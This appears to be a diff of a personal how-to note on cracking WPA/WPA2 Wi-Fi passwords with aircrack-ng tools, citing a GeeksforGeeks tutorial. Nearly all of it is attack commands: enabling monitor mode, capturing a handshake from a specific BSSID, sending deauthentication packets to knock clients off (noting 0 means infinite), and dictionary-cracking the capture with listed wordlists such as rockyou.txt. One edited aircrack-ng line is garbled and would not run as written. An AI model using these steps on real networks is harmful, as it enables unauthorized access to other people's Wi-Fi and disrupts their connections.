@@ -20,7 +20,7 @@ output:
 
 			PID Name
 			1568 wpa_supplicant
-3. airmon-ng start wlp1s0
+3. sudo airmon-ng start wlp1s0
 output:
 
 	sudo airmon-ng start wlp1s0
@@ -61,7 +61,9 @@ sudo airodump-ng -c 3 --bssid 3C:7C:3F:B5:F3:A0 -w ./  wlp1s0mon
     
      aireplay-ng : To inject frames
     -0 : For deauthentication
-    10 : No. of deauthentication packets to be sent(0 would mean infinite)
+    10 : No. of deauthentication packets to be sent
+         (0 would mean infinite)
+           
     -a : For the bssid of the target network
     wlp1s0mon : Name of the interface.
  
@@ -72,7 +74,7 @@ sudo airodump-ng -c 3 --bssid 3C:7C:3F:B5:F3:A0 -w ./  wlp1s0mon
  
  7. To decrypt the password. Open the Files application. 
  
- aircrack-ng -a2 -b  3C:7C:3F:B5:F3:A0 -w /usr/share/metasploit-framework/data/wordlists/common_roots.txt ./-01.cap
+ aircrack-ng -a2 -b  3C:7C:3F:B5:F3:A0 -w /u  /usr/share/wordlists/rockyou.txt ./-01.cap
  
  aircrack-ng : 802.11 WEP and WPA-PSK keys cracking program
 -a : -a2 for WPA2 & -a for WPA network
@@ -80,6 +82,9 @@ sudo airodump-ng -c 3 --bssid 3C:7C:3F:B5:F3:A0 -w ./  wlp1s0mon
 -w : Location of the wordlist file
 -01.cap :  cap file
  
- 
-    
+ passward lists
+  /usr/share/wordlists/rockyou.txt
+  /usr/share/wordlists/wifite.txt
+  /usr/share/metasploit-framework/data/wordlists/sid.txt
+  /usr/share/metasploit-framework/data/wordlists/common_roots.txt  
 https://www.geeksforgeeks.org/linux-unix/how-to-hack-wpa-wpa2-wifi-using-kali-linux/
